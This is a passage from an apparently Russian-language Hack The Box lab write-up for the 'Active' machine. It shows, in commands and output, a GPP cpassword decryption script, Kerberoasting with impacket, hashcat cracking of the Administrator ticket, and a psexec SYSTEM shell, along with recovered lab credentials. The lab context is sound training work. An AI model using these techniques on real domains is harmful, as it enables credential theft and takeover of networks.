userName="active.htb\SVC_TGS"
```

Разумеется, в Микрософте не дурачки сидят, поэтому пароль зашифрован AES-256'ом, а ключ шифрования [открыто выложен на MSDN](https://msdn.microsoft.com/en-us/library/cc422924.aspx "[MS-GPPREF]: Password Encryption")... :neutral_face:

И несмотря на вышедший в 2014 патч, запрещающий хранить пароли в `Groups.xml`, в 2018 все равно остается вероятность наткнуться на такого рода косяки. Подробнее о проблеме можно почитать [здесь](https://adsecurity.org/?p=2288 "Finding Passwords in SYSVOL & Exploiting Group Policy Preferences – Active Directory Security").

## Декрипт cpassword
### gpp-decrypt
В Kali есть дефолтная тулза для расшифрования паролей `cpassword`, имя ей "gpp-decrypt":
```text
root@kali:~# gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
GPPstillStandingStrong2k18
```

### PowerShell-скрипт
Вот [тут вот](https://obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html "obscuresec: GPP Password Retrieval with PowerShell") есть интересный скрипт для PSH, которым не мог не поделиться. Выполняет ту же задачу:
```powershell
function getpwd([string]$Cpassword) {
	$pl = $Cpassword.length % 4
	if($pl -eq 0){$pad = ""}
	else{$Pad = "=" * (4 - ($Cpassword.length % 4))}
	$Base64Decoded = [Convert]::FromBase64String($Cpassword + $Pad)
	#Create a new AES .NET Crypto Object
	$AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
	#Static Key from http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
	[Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
	#Set IV to all nulls (thanks Matt) to prevent dynamic generation of IV value
	$AesIV = New-Object Byte[]($AesObject.IV.Length)
	$AesObject.IV = $AesIV
	$AesObject.Key = $AesKey
	$DecryptorObject = $AesObject.CreateDecryptor()
	[Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

	return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
}
```

[![active-powershell-gpp-decrypt.png]({{ "/img/htb/boxes/active/active-powershell-gpp-decrypt.png" | relative_url }})]({{ "/img/htb/boxes/active/active-powershell-gpp-decrypt.png" | relative_url }})

В любом случае мы получили авторизационные данные: `SVC_TGS:GPPstillStandingStrong2k18`.

## PrivEsc: Anonymous → SVC_TGS
Получив пользовательский доступ к SMB, заберем первый флаг из `\\10.10.10.100\Users`:
```text
root@kali:~# smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users -A user.txt -q
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445        Name: 10.10.10.100
        Disk                                                    Permissions
        ----                                                    -----------
        Users                                                   READ ONLY
        [+] Starting search for files matching 'user.txt' on share Users.
        [+] Match found! Downloading: Users\SVC_TGS\Desktop\user.txt
```

### user.txt
```text
root@kali:~# cat /usr/share/smbmap/10.10.10.100-Users_SVC_TGS_Desktop_user.txt
86d67d8b????????????????????????
```

# Kerberoasting — Порт 88
## Получение пользователей AD (GetADUsers.py)
Итак, у нас есть аккаунт внутри домена. С помощью пакета [impacket](https://github.com/SecureAuthCorp/impacket "SecureAuthCorp/impacket: Impacket is a collection of Python classes for working with network protocols.") посмотрим, о каких еще юзерах известно контроллеру:
```text
root@kali:~# GetADUsers.py -all active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 22:06:40  2018-12-11 04:20:35
Guest                                                 <never>              <never>
krbtgt                                                2018-07-18 21:50:36  <never>
SVC_TGS                                               2018-07-18 23:14:38  2018-12-13 23:30:55
```

## Кратко об атаке
Первое, что приходит на ум — атака типа *Kerberoasting*. Хорошие материалы по атаке: [презентация от автора](https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf "PowerPoint Presentation - Kicking the Guard Dog of Hades - Attacking Microsoft Kerberos - Tim Medin(1).pdf") и два поста ([один](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/ "Kerberoasting Without Mimikatz – harmj0y"), [два](https://www.scip.ch/en/?labs.20181011 "Kerberoasting - Stealing Service Account Credentials")).

Идея вкратце: если нужный нам аккаунт (администратор, конечно) ассоциирован с записью SPN (aka ***S**ervice **P**rincipal **N**ame*), мы можем попросить у Керберовского KDC (aka ***K**ey **D**istribution **C**enter*) на контроллере соответствующий TGS (aka *Service Ticket*), который будет содержать хеш пароля от этого аккаунта. Если пароль слабый, мы легко восстановим его в офлайне.

## Получение SPN пользователей AD (GetUserSPNs.py)
Для энумерации SPN'ов так же можно воспользоваться скриптом из коллекции impacket.

Одной командой я заберу всех пользователей, для которых есть SPN, а также хеши их паролей (в чем мне помогает флаг `-request`):
```text
root@kali:~# GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request -output tgs-administrator.hash
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 22:06:40  2018-12-11 04:20:35
```

```text
root@kali:~# cat tgs-administrator.hash
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$55c71f4c1c309f9760aeb823e58e2917$a5b2d222c3114d73633f9df66f63339bfa3aaf6fa0d3a9409eedcd66f1cdef7df41881db81bab644b5bb8f8974e0b3521c79f0c36507456693e64b1fb85bd039b25d02f0a5c3fb36c139d3d71b7b43cc0656418a7822ef33db16b02e2e3cdd20258b893b8a9abcb00b60ed1ef7e506b084bd828a23d66753f82279d53ce2a7917df6bc6836842de1cecc841b5a6c4c1fc0f2e548cd119589e5dde5cbb216019e6d778fc6a3be19d2af7b5922e264b314e89560ca6b345a8b4a5d77fa4618bd732d93dd97d7a8f48c53eb63732c29abc309d99a3e63207c40a1c2352539f6d2fba15441c91baca8278d5f0d674fccac0d863ba3d73773f43cc8d2992a9489e994a161b510d992ce876368254ab0ca34a004685e8b4cd0de2c76c21e6b0d7e71cad39f859958c3571ed5c010c7e0cedb0943475ec9c7f6b2d2602371a6809fe6b2bb5d7794341800f0a6b5e28a18e0b4bc9d14f5cbb511c461d6f88b88235c454433306aeea77fa55a9a1a8a330df1880653f51409ff39c2afaa328816027ba23d0c517e1bb8d6c50f91ab197bc2c82c0d6faf5c7007e61cecae1e742a73bee291a13fe640f2cb0d8acea57008594287350dfe7a579020a0f6e99eea9c5e70742b2a1213d4b06b4185ede772f6b9acd9f5109c74ae84722c3c77d93ac110d9bf1e6ca7a734316ecdce4559c6f5b5bbc7eaf42f292eb13b5155b38144d4de49c722bf1a83a42ac4e8c42d29ddc082b28b80f2a26ee97cbf4048469248ec5e07b4c1028ff8124dfd61677a42164801b4d2074ad5798a607b265986b48c2ded3ecad472ecdcf6c2e641d75390601cc7e7f1c4b73a5a6ac7310500ee51e57e1d3b7f4075ed823c26013f7e878d62ef6b6dbd250fc59b084cd1e67c61578ec2c598888ce9682638564a74e58765df4ecb71bab48094486004908be6e6e30e629d2790b29fd0fe10459fdf331f1f825b87db9fe3ebb2f31e5bede94aec4c0098eb797288acfb5bf9e6e8eed96d166d2820fdef8d8cba6cb65b26af502b6e66ff6645b4a48ab9c665f609713fbdd3eb4b9944693f4295edee83c3bf12922dcef99a08b9a6316c0f3b63aef703c47790d8d1db66bf72b0735e42f792431c1361fb5b08d2dbe036fd2e66bb6bf51f992f2755f2bc25bd8778777fa8e1bfde0a727de47763e585137fc3de4d363380ae39223990454dc03ddb8237db947f5506ed02da715d10c4969868d1498dd9890d6ead2b445c017134f787633e42e1d63a
```

## Восстановление пароля админа (Hashcat)
Восстанавливать прообраз хеша будем с помощью [Hashcat](https://github.com/hashcat/hashcat "hashcat/hashcat: World's fastest and most advanced password recovery utility"). Также с этой задачей справится и [JtR версии Jumbo](https://github.com/magnumripper/JohnTheRipper "magnumripper/JohnTheRipper: This is the official repo for the Jumbo version of John the Ripper. The 'bleeding-jumbo' branch (default) is based on 1.8.0-Jumbo-1 (but we are literally several thousands of commits ahead of it).").

Для начала заглянем в [шпаргалку](https://hashcat.net/wiki/doku.php?id=example_hashes "example_hashes [hashcat wiki]") по режимам Hashcat'а и выясним, что нужный нам режим — `13100`. Теперь можно начинать:
```text
root@kali:~# hashcat -a 0 -m 13100 tgs-administrator.hash /usr/share/wordlists/rockyou.txt --force
...
```

```text
root@kali:~# hashcat -m 13100 tgs-administrator.hash --show
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$55c71f4c1c309f9760aeb823e58e2917$a5b2d222c3114d73633f9df66f63339bfa3aaf6fa0d3a9409eedcd66f1cdef7df41881db81bab644b5bb8f8974e0b3521c79f0c36507456693e64b1fb85bd039b25d02f0a5c3fb36c139d3d71b7b43cc0656418a7822ef33db16b02e2e3cdd20258b893b8a9abcb00b60ed1ef7e506b084bd828a23d66753f82279d53ce2a7917df6bc6836842de1cecc841b5a6c4c1fc0f2e548cd119589e5dde5cbb216019e6d778fc6a3be19d2af7b5922e264b314e89560ca6b345a8b4a5d77fa4618bd732d93dd97d7a8f48c53eb63732c29abc309d99a3e63207c40a1c2352539f6d2fba15441c91baca8278d5f0d674fccac0d863ba3d73773f43cc8d2992a9489e994a161b510d992ce876368254ab0ca34a004685e8b4cd0de2c76c21e6b0d7e71cad39f859958c3571ed5c010c7e0cedb0943475ec9c7f6b2d2602371a6809fe6b2bb5d7794341800f0a6b5e28a18e0b4bc9d14f5cbb511c461d6f88b88235c454433306aeea77fa55a9a1a8a330df1880653f51409ff39c2afaa328816027ba23d0c517e1bb8d6c50f91ab197bc2c82c0d6faf5c7007e61cecae1e742a73bee291a13fe640f2cb0d8acea57008594287350dfe7a579020a0f6e99eea9c5e70742b2a1213d4b06b4185ede772f6b9acd9f5109c74ae84722c3c77d93ac110d9bf1e6ca7a734316ecdce4559c6f5b5bbc7eaf42f292eb13b5155b38144d4de49c722bf1a83a42ac4e8c42d29ddc082b28b80f2a26ee97cbf4048469248ec5e07b4c1028ff8124dfd61677a42164801b4d2074ad5798a607b265986b48c2ded3ecad472ecdcf6c2e641d75390601cc7e7f1c4b73a5a6ac7310500ee51e57e1d3b7f4075ed823c26013f7e878d62ef6b6dbd250fc59b084cd1e67c61578ec2c598888ce9682638564a74e58765df4ecb71bab48094486004908be6e6e30e629d2790b29fd0fe10459fdf331f1f825b87db9fe3ebb2f31e5bede94aec4c0098eb797288acfb5bf9e6e8eed96d166d2820fdef8d8cba6cb65b26af502b6e66ff6645b4a48ab9c665f609713fbdd3eb4b9944693f4295edee83c3bf12922dcef99a08b9a6316c0f3b63aef703c47790d8d1db66bf72b0735e42f792431c1361fb5b08d2dbe036fd2e66bb6bf51f992f2755f2bc25bd8778777fa8e1bfde0a727de47763e585137fc3de4d363380ae39223990454dc03ddb8237db947f5506ed02da715d10c4969868d1498dd9890d6ead2b445c017134f787633e42e1d63a:Ticketmaster1968
```

Успех. Авторизационные данные для привилегированного доступа — `Administrator:Ticketmaster1968`.

## PrivEsc: SVC_TGS → Administrator
Можем забрать `root.txt` из админской шары с помощью smbmap точно так же, как я показывал это [здесь](), а можем с помощью *impacket/psexec.py* (или *impacket/wmiexec.py* — синтаксис одинаковый) инициировать рут-сессию:

```text
root@kali:~# psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100
Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file hPUtqrwN.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service QclS on 10.10.10.100.....
[*] Starting service QclS.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

### root.txt
```text
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
b5fc76d1????????????????????????
```

```text
C:\Windows\system32>exit
[*] Process cmd.exe finished with ErrorCode: 0, ReturnCode: 0
[*] Opening SVCManager on 10.10.10.100.....
[*] Stopping service QclS.....
[*] Removing service QclS.....
[*] Removing file hPUtqrwN.exe.....
```

Пожалуй, на этом все :triumph:

# Эпилог
## Монтирование SMB в Kali
Монтировать SMB-шару (`//10.10.10.100/Users`, к примеру) в Kali Linux можно таким образом:
```text
root@kali:~# mount -t cifs //10.10.10.100/Users /mnt/smb -v -o user=SVC_TGS,pass=GPPstillStandingStrong2k18
mount.cifs kernel mount options: ip=10.10.10.100,unc=\\10.10.10.100\Users,user=SVC_TGS,pass=********
```

```text
root@kali:~# ls -la /mnt/smb
total 33
drwxr-xr-x 2 root root 4096 Jul 21 17:39  .
drwxr-xr-x 3 root root 4096 Aug  8 15:54  ..
drwxr-xr-x 2 root root    0 Jul 16 13:14  Administrator
l--------- 1 root root    0 Jul 14  2009 'All Users' -> '/??/C:/ProgramData'
drwxr-xr-x 2 root root 8192 Jul 14  2009  Default
drwxr-xr-x 2 root root 8192 Jul 14  2009 'Default User'
-rwxr-xr-x 1 root root  174 Jul 14  2009  desktop.ini
drwxr-xr-x 2 root root 4096 Jul 14  2009  Public
drwxr-xr-x 2 root root 4096 Jul 21 18:16  SVC_TGS
```

[![active-nautilus-smb.png]({{ "/img/htb/boxes/active/active-nautilus-smb.png" | relative_url }})]({{ "/img/htb/boxes/active/active-nautilus-smb.png" | relative_url }})

Проверить состояние так:
```text
root@kali:~# mount -v | grep 'type cifs'
//10.10.10.100/Users on /mnt/smb type cifs (rw,relatime,vers=default,cache=strict,username=SVC_TGS,domain=,uid=0,noforceuid,gid=0,noforcegid,addr=10.10.10.100,file_mode=0755,dir_mode=0755,soft,nounix,mapposix,rsize=1048576,wsize=1048576,echo_interval=60,actimeo=1,user=SVC_TGS)
```

```text
root@kali:~# root@kali:~# df -k -F cifs
Filesystem           1K-blocks     Used Available Use% Mounted on
//10.10.10.100/Users  41838588 23867232  17971356  58% /mnt/smb
```

А размонтировать, соответственно, так:
```text
root@kali:~# umount /mnt/smb
```

Укрощайте трехголовых стражей царства мертвых, спасибо за внимание :innocent:

{: .center-image}
![active-owned-user.png]({{ "/img/htb/boxes/active/active-owned-user.png" | relative_url }})

{: .center-image}
![active-owned-root.png]({{ "/img/htb/boxes/active/active-owned-root.png" | relative_url }})

{: .center-image}
![active-trophy.png]({{ "/img/htb/boxes/active/active-trophy.png" | relative_url }})
